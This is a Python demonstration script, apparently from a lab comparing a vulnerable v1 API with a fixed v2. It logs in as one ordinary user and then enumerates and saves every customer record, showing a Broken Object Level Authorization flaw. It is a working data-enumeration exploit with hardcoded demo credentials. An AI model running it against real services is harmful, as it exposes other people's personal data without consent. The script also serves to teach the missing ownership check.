#!/usr/bin/env python3
"""
The "half-fix failure" experiment against the v1 API.

v1 requires authentication. This script shows that authentication alone does NOT
stop the breach:

  1. Control    : without a token, /v1 is blocked  -> auth really is enforced.
  2. Log in     : as a single ordinary user (user1) -> obtain a valid JWT.
  3. Legitimate : read our own record (id=1)         -> allowed, as expected.
  4. Attack     : enumerate ALL records with that same token -> still succeeds.

The point: a logged-in user can read every other user's data because the API
never checks object ownership (Broken Object Level Authorization). Only v2 fixes
this. Standard library only; no pip install needed.

Usage:
    python enumerate_authenticated.py [http://host:port]
"""

import json
import sys
import time
import urllib.error
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"
USER = "user1"
PASSWORD = "password"


def login(username, password):
    body = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        f"{BASE}/api/auth/login", data=body,
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req) as r:
        return json.load(r)["token"]


def get(path, token=None):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    req = urllib.request.Request(f"{BASE}{path}", headers=headers)
    with urllib.request.urlopen(req) as r:
        return json.load(r)


def main():
    # 1. Control: prove authentication is actually enforced on v1.
    print("[*] Control: requesting /v1/api/customers/2 with NO token...")
    try:
        get("/v1/api/customers/2")
        print("    !! unexpected: got data without authenticating")
    except urllib.error.HTTPError as e:
        print(f"    blocked (HTTP {e.code}) -> authentication IS enforced on v1.\n")

    # 2. Log in as one ordinary user.
    token = login(USER, PASSWORD)
    print(f"[+] Logged in as '{USER}', received a valid JWT.\n")

    # 3. Legitimate access: our own record.
    mine = get("/v1/api/customers/1", token)
    print(f"[*] Reading our own record (id=1): {mine['fullName']} — fine, we own it.\n")

    # 4. The attack: enumerate everyone with the same single-user token.
    total = get("/v1/api/customers/count", token)["total"]
    print(f"[*] Now enumerating all {total} records while still just '{USER}'...")
    start = time.time()
    stolen = []
    for i in range(1, total + 1):
        try:
            stolen.append(get(f"/v1/api/customers/{i}", token))
        except urllib.error.HTTPError:
            pass
        if i % 1000 == 0:
            print(f"    pulled {i} / {total} ...")
    elapsed = time.time() - start

    print(f"\n[+] As a single authenticated user, exfiltrated {len(stolen)} records "
          f"in {elapsed:.1f}s.")
    print("[!] Authentication did NOT stop the breach. The missing control is")
    print("    object-level authorization (checking the record's owner == caller).")

    with open("stolen_data_v1.json", "w") as f:
        json.dump(stolen, f, indent=2)
    print("\n[+] Written to stolen_data_v1.json")


if __name__ == "__main__":
    main()
